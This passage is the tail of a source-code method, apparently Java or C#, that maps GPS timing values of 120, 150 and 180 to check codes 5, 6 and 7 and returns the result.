        }else if(timeGPS == 120)
        {
            check = 5;
        }else if(timeGPS ==150)
        {
            check = 6;
        }else if(timeGPS ==180)
        {
            check = 7;
        }
        return check;
    }
}
